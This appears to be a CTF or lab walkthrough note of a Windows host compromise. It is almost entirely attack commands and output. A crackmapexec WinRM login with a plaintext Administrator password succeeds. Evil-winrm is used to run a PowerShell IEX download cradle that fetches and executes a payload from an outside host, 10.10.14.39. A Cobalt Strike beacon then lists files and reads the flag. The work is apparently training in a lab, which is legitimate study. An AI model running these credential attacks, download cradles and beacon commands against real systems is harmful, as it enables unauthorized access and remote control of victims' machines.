# crackmapexec winrm password spray

```powershell
┌──(kali㉿gobots)-[04Apr2024 14:32:43]-[~]
└─$ crackmapexec winrm 10.10.110.25 -u Administrator -p 'LongAgoFarAway'
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.110.25    5985   WS02-ATHENA      [*] Windows 10.0 Build 19041 (name:WS02-ATHENA) (domain:WS02-Athena)
HTTP        10.10.110.25    5985   WS02-ATHENA      [*] http://10.10.110.25:5985/wsman
WINRM       10.10.110.25    5985   WS02-ATHENA      [+] WS02-Athena\Administrator:LongAgoFarAway (Pwn3d!)
```
![[Pasted image 20240404110618.png]]

# evilwinrm login to cobalt strike beacon

```powershell
┌──(kali㉿gobots)-[04Apr2024 14:56:35]-[~]
└─$ evil-winrm  -i 10.10.110.25 -u Administrator -p 'LongAgoFarAway'                                   

Evil-WinRM shell v3.5   
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/cheese'))

```

# flag

```powershell
[04/04 11:00:54] beacon> ls
[04/04 11:00:54] [*] Tasked beacon to list files in .
[04/04 11:00:54] [+] host called home, sent: 19 bytes
[04/04 11:00:54] [*] Colors scheme:
[*] ---------------------------
[*] Directories:  YELLOW 
[*] Cobalt Strike Uploaded Files: BLUE
[*] Sensitive files:  RED 
[*] Configuration files:  DARK GREEN 
[*] Archives:  ORANGE 
[*] Source codes:  DARK BLUE 
[*] Executables:  MAGENTA 
[*] Documents:  GREEN 
[+] Location: C:\users\Administrator\Desktop\*

 Size       Type    Last Modified         Name
 ----       ----    -------------------   ----
 282B       fil     02/24/2021 15:09:56   desktop.ini 
 31B        fil     12/01/2020 04:42:45   flag.txt 

Files and dirs count: 2, total size of files: 313B (output len: 158)

[04/04 11:01:00] beacon> shell type flag.txt
[04/04 11:01:00] [*] Tasked beacon to run: type flag.txt
[04/04 11:01:01] [+] host called home, sent: 44 bytes
[04/04 11:01:01] [+] received output:
GENESIS{L34RN_FR0M_OuR_H1ST0RY}
```
![[Pasted image 20240404110804.png]]